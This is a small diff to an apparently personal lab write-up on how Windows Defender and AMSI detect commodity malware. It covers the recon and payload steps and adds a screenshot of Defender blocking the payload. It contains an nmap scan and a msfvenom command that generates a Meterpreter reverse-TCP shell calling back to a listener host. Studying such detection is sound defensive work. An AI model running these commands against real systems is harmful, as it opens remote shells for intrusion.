@@ -16,7 +16,7 @@ Understand how Windows Defender + AMSI detects and blocks commodity malware, and
 ## Attack Chain
 
 ### 1. Recon
-``
+
 nmap -sV -sC 192.168.56.104
 
 Found open ports: 135, 445
@@ -24,6 +24,8 @@ Found open ports: 135, 445
 2. Generate Basic Payload
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=4444 -f exe > shell.exe
+
+![Defender Block](../screenshots/Day24_basic_payloads.png)
 
 3. Start Listener
 
